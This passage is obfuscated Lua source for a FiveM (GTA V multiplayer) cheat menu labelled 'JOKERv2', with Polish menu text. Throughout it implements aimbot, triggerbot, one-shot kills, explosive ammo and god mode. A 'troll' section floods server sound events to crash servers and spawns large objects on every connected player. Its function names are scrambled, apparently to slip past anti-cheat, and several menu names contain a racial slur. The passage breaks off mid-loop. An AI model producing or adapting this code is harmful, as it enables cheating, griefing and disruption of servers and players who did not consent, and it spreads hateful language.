                        ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                        ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                        ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                        ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                        ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                        ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                        ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                        DrawLine(
                            LineOneBegin.x,
                            LineOneBegin.y,
                            LineOneBegin.z,
                            LineOneEnd.x,
                            LineOneEnd.y,
                            LineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineTwoBegin.x,
                            LineTwoBegin.y,
                            LineTwoBegin.z,
                            LineTwoEnd.x,
                            LineTwoEnd.y,
                            LineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeBegin.x,
                            LineThreeBegin.y,
                            LineThreeBegin.z,
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            LineThreeEnd.x,
                            LineThreeEnd.y,
                            LineThreeEnd.z,
                            LineFourBegin.x,
                            LineFourBegin.y,
                            LineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineOneBegin.x,
                            TLineOneBegin.y,
                            TLineOneBegin.z,
                            TLineOneEnd.x,
                            TLineOneEnd.y,
                            TLineOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineTwoBegin.x,
                            TLineTwoBegin.y,
                            TLineTwoBegin.z,
                            TLineTwoEnd.x,
                            TLineTwoEnd.y,
                            TLineTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeBegin.x,
                            TLineThreeBegin.y,
                            TLineThreeBegin.z,
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            TLineThreeEnd.x,
                            TLineThreeEnd.y,
                            TLineThreeEnd.z,
                            TLineFourBegin.x,
                            TLineFourBegin.y,
                            TLineFourBegin.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorOneBegin.x,
                            ConnectorOneBegin.y,
                            ConnectorOneBegin.z,
                            ConnectorOneEnd.x,
                            ConnectorOneEnd.y,
                            ConnectorOneEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorTwoBegin.x,
                            ConnectorTwoBegin.y,
                            ConnectorTwoBegin.z,
                            ConnectorTwoEnd.x,
                            ConnectorTwoEnd.y,
                            ConnectorTwoEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorThreeBegin.x,
                            ConnectorThreeBegin.y,
                            ConnectorThreeBegin.z,
                            ConnectorThreeEnd.x,
                            ConnectorThreeEnd.y,
                            ConnectorThreeEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )
                        DrawLine(
                            ConnectorFourBegin.x,
                            ConnectorFourBegin.y,
                            ConnectorFourBegin.z,
                            ConnectorFourEnd.x,
                            ConnectorFourEnd.y,
                            ConnectorFourEnd.z,
                            ra.r,
                            ra.g,
                            ra.b,
                            255
                        )

                        DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                    end
                end
            end

            if VehGodkjhbgkfljugfh and IsPedInAnyVehicle(PlayerPedId(), true) then
                SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
            end

            if showCoordsdjkhfgidkfdgfdkjghdflkgfg then 
                kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl,ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw = table.unpack(GetEntityCoords(GetPlayerPed(-1),true))
                roundx=tonumber(string.format("%.2f",kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc))
                roundy=tonumber(string.format("%.2f",riNXBfISndxkHbIUAdmpVnQHstshQdqELCNkcesVCDvoiVxmVwprvl))
                roundz=tonumber(string.format("%.2f",ammSjUXRjXNvlMInQTHlXzwzWoPngUdPOsHEjyNDnRVdonAJPmspFw))
                bfsdijouhgyoidfgdfg("~r~X:~s~ "..roundx,0.05,0.00)
                bfsdijouhgyoidfgdfg("~r~Y:~s~ "..roundy,0.11,0.00)
                bfsdijouhgyoidfgdfg("~r~Z:~s~ "..roundz,0.17,0.00)
            end

            if bulletGunfjdhkglijkdfgdfg then
                local startDistance = GetDistanceskjghfdlkiugdfg(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                local endDistance = GetDistanceskjghfdlkiugdfg(GetGameplayCamCoord(), GetEntityCoords(PlayerPedId(), true))
                startDistance = startDistance + 0.25
                endDistance = endDistance + 1000.0

                if IsPedOnFoot(PlayerPedId()) and IsPedShooting(PlayerPedId()) then
                    local bullet = GetHashKey(bulletsuidyfgidofgd[selectedBullethyuidgsfuisdfsd])
                    if not HasWeaponAssetLoaded(bullet) then
                        RequestWeaponAsset(bullet, 31, false)
                        while not HasWeaponAssetLoaded(bullet) do
                            Citizen.Wait(0)
                        end
                    end
                    ShootSingleBulletBetweenCoords(adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), startDistance)).x, adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), startDistance)).y, adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), startDistance)).z, adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), endDistance)).x, adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), endDistance)).y, adddhifgiodugfdg(GetGameplayCamCoord(), multiplyygsudiyfghgdg(rotDirectiondfjkgihdfilougdfg(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, PlayerPedId(), true, false, -1.0)
                end

            end

            if vehicleGunyuidsygodfg then
                local heading = GetEntityHeading(PlayerPedId())
                local model = GetHashKey(vehiclesiusdyfousidf[selectedVehicleuiusdyfuisdof])
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirectionusyigifdgu8dfg(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistanceskjghfdlkiugdfg(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = adddhifgiodugfdg(camPosition, multiplyygsudiyfghgdg(dir, spawnDistance))

                RequestModel(model)
                while not HasModelLoaded(model) do
                    debugPrintsdfhusdfksdf("Loading Model...")
                    Citizen.Wait(0)
                end

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        if IsPedOnFoot(PlayerPedId()) then
                        local veh = CreateVehicle(model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                        SetModelAsNoLongerNeeded(model)
                        SetVehicleAsNoLongerNeeded(veh)
                        end
                    end		
                end							
            end

            if pedGundsjhkgfuidsg then
                local heading = GetEntityHeading(PlayerPedId())
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirectionusyigifdgu8dfg(rot)
                local camPosition = GetGameplayCamCoord()
                local playerPosition = GetEntityCoords(PlayerPedId(), true)
                local spawnDistance = GetDistanceskjghfdlkiugdfg(camPosition, playerPosition)
                spawnDistance = spawnDistance + 5
                local spawnPosition = adddhifgiodugfdg(camPosition, multiplyygsudiyfghgdg(dir, spawnDistance))

                local model = GetHashKey(pedsoifdugpodfgdfg[selectedPedjhdsgfdgfdg])

                RequestModel(model)
                while not HasModelLoaded(model) do
                    Citizen.Wait(0)
                end					

                if HasModelLoaded(model) then
                    if IsPedShooting(PlayerPedId()) then
                        local spawnedPed = CreatePed(26, model, spawnPosition.x, spawnPosition.y, spawnPosition.z, heading, true, true)	
                        SetEntityRecordsCollisions(spawnedPed, true)																
                        for f = 0.0, 75.0 do
                            if HasEntityCollidedWithAnything(spawnedPed) then break end
                                ApplyForceToEntity(spawnedPed, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                        end							
                    end		
                end								
            end

            if forceGunfdkgjhdflkgdfgkfjdlhgdlkfgfg then
                local rot = GetGameplayCamRot(0)
                local dir = RotToDirectionusyigifdgu8dfg(rot)
                local heading = GetEntityHeading(PlayerPedId())
                if IsPedShooting(PlayerPedId()) then
                    local aiming, entity = GetEntityPlayerIsFreeAimingAt(PlayerId())
                    if aiming then											
                        if IsPedInAnyVehicle(entity) then
                            local veh = GetVehiclePedIsUsing(entity)
                            DeleteEntity(entity)
                            SetEntityHeading(veh, heading)
                            SetVehicleForwardSpeed(veh, 150.0)
                        else 
                            for i = 0, 10 do
                                ApplyForceToEntity(entity, 1, dir.x * 10.0, dir.y * 10.0, dir.z * 10.0, 0.0, 0.0, 0.0, false, false, true, true, false, true)
                            end						
                        end									
                    end				
                end
            end

            if explosiveAmmouidsygoidfgfdfdjlohgldfgdfg then
                local impact, coords = GetPedLastWeaponImpactCoord(PlayerPedId())
                if impact then
                    AddExplosion(coords.x, coords.y, coords.z, 2, 100000.0, true, false, 0)
                end
            end
                                                
            if Aimbothdsjigfisdfsdf then
                for i = 0, 128 do
                    if i ~= PlayerId() then
                        if IsPlayerFreeAiming(PlayerId()) then
                            local TargetPed = GetPlayerPed(i)
                            local TargetPos = GetEntityCoords(TargetPed)
                            local Exist = DoesEntityExist(TargetPed)
                            local Dead = IsPlayerDead(TargetPed)

                            if Exist and not Dead then
                                local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                                if IsEntityvisiblehuydsguifksdf(TargetPed) and OnScreen then
                                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
                                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                                    end
                                end
                            end
                        end
                    end
                end	
            end
        
            if TriggerBotifudytgoid8fgfdg then
                local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
                if Aiming then
                    if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                        ShootPlayerhgufiydsfdsfdsdfdfiughdflogdfg(Entity)
                    end
                end
            end
			
        
            if fastrundfhjkgkjdfgdfg then
                SetRunSprintMultiplierForPlayer(PlayerId(), 2.49)
                SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
            else
                SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
            end

            if SuperJumpdfhjkgdflkijgdfg then
                SetSuperJumpThisFrame(PlayerId())
            end

            if Oneshotjhausfguiydshgfuidsfdsffdljkghdlfkgjdfihfghfdlkhgjlghgfh then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntitysjudifhyisdfdsf(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
        end
    end)

Citizen.CreateThreadNow(
    function()

        local currentTintdfkjhgdfg = 1
        local selectedTintfdlkgjdfgf = 1

        kaeogkeargmioergoeismgsdfg.ChocoSsieMiPalefdgkojifdlgdfg("MainMenu", "~g~         &&&&&&&JOKER~b~v2")
        kaeogkeargmioergoeismgsdfg.SetSubtitleshdkgfjkisdfsdfjkfhgdfgfgfdgkjhdfgfg("MainMenu", "Skrrrrrrtttttttttttttttt")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("SelfMenu", "MainMenu", "WPADAJ NA DISCORD!")
		kaeogkeargmioergoeismgsdfg.utyiut7iteger("Modele", "SelfMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("OnlinePlayersMenu", "MainMenu", "Graczy Online: " .. #getPlayerIdssdkghldifugdfg())
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("WeaponMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("SingleWeaponMenu", "WeaponMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("MaliciousMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("ESXMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("ESXMoneyMenu", "ESXMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("VehMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("VehSpawnOpt", "VehMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("PlayerOptionsMenu", 'OnlinePlayersMenu', "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("TeleportMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("NiggerCustoms", "VehMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("PlayerTrollMenu", "PlayerOptionsMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("TrollMenu", "MainMenu", "WPADAJ NA DISCORD!")
		kaeogkeargmioergoeismgsdfg.utyiut7iteger("Propy", "TrollMenu", "WPADAJ NA DISCORD!")
		kaeogkeargmioergoeismgsdfg.utyiut7iteger("Pedy", "TrollMenu", "WPADAJ NA DISCORD!")
		kaeogkeargmioergoeismgsdfg.utyiut7iteger("CS", "TrollMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("WeaponCustomization", "WeaponMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("WeaponTintMenu", "WeaponCustomization", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("VehicleRamMenu", "PlayerTrollMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("ESXBossMenu", "ESXMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("SpawnPropsMenu", "PlayerTrollMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("PerformanceMenu", "NiggerCustoms", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("SingleWepPlayer", 'PlayerOptionsMenu', "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("CreditsMenu", "MainMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("JailMenu", "ESXMenu", "WPADAJ NA DISCORD!")
        kaeogkeargmioergoeismgsdfg.utyiut7iteger("VehBoostMenu", "NiggerCustoms", "WPADAJ NA DISCORD!")

        local erhrthrtyjtyjzdvfsdfergerg = { "MainMenu", "SelfMenu", "OnlinePlayersMenu", "WeaponMenu", "SingleWeaponMenu", "MaliciousMenu", 
                            "ESXMenu", "ESXMoneyMenu", "VehMenu", "VehSpawnOpt", "PlayerOptionsMenu", 
                            "TeleportMenu", "NiggerCustoms", "PlayerTrollMenu",
                            "TrollMenu", "WeaponCustomization", "WeaponTintMenu",
                            "VehicleRamMenu", "ESXBossMenu", "SpawnPropsMenu", "PerformanceMenu", "SingleWepPlayer", "CreditsMenu", "VehBoostMenu",
                            "JailMenu"}


        while Enableddsyfusdsdfsdffdkjghdflgf do
            if kaeogkeargmioergoeismgsdfg.reyrtrtjhy("MainMenu") then
                if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje wlasne »", "SelfMenu") then
				elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("OPCJE globalne »", "MaliciousMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Menu teleportacji »", "TeleportMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Lista graczy »", "OnlinePlayersMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje broni »", "WeaponMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje pojazdu »", "VehMenu") then
				elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje ESX »", "ESXMenu") then
                elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Opcje Rozpierdalania »", "TrollMenu") then
                elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("~g~wylacz menu xd") then
                    Enableddsyfusdsdfsdffdkjghdflgf = false
                end


                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("TrollMenu") then
			    if kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Propy »", "Propy") then
				elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Pedy »", "Pedy") then
				elseif kaeogkeargmioergoeismgsdfg.ehrtuydfbweeweghd("Counter-Strike »", "CS") then
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Interact Sound Crasher", "~g~ESX") then
				for i=0, 32 do 
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "unlock", 1.0)
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "lock", 1.0)
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "cuff", 1.0)
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "demo", 1.0)
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "belton", 1.0)
				TriggerServerEvent("InteractSound_SV:PlayWithinDistance", 10000, "beltoff", 1.0)
			end
		end
				
                kaeogkeargmioergoeismgsdfg.rturtyue5tjtdfndt()
            elseif kaeogkeargmioergoeismgsdfg.reyrtrtjhy("Propy") then
				if kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Drzwi banku na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_fin_vaultdoor_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Samolot 1 na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_med_jet_01_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Tramwaj na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "p_tram_crash_s"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Skrzynki z bronią do wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "hei_prop_carrier_crate_01b"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Billboard do wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_billboard_12"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Paleto na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "cs1_lod2_01_7_slod3"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z-5,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Sandy na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "cs4_lod_01_slod3"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z-5,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Dom na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "lf_house_07_"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Wielki ekran na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_big_cin_screen"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Schody na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_bleachers_05_cr"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					AttachEntityToEntity(objfdgjhkfdg,GetPlayerPed(i),GetPedBoneIndex(GetPlayerPed(i),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Podstawka na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_bmu_02_ld"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Pudło na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_box_wood08a"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg)) 
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Koło z drewna na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_cablespool_01b"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
					end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Łódka na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_can_canoe"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cement na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_cementbags01"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Drzewko na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_tree_olive_cr2"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Choinka na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_xmas_tree_int"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
						Citizen.Wait(0) 
						RequestModel(GetHashKey(propdfgjhkldfg))  
					end
					local objfdgjhkfdg = CreateObject(GetHashKey(propdfgjhkldfg),coords.x,coords.y,coords.z,true,true,true)
				end
				elseif kaeogkeargmioergoeismgsdfg.Przyciskxdduygsfusidgfysdf("Cegły 1 na wszystkich", "~r~Native") then
					for i=0, 128 do 
					local coords = GetEntityCoords(GetPlayerPed(i), true)
					local propdfgjhkldfg = "prop_conc_blocks01a"
					while not HasModelLoaded(GetHashKey(propdfgjhkldfg)) do 
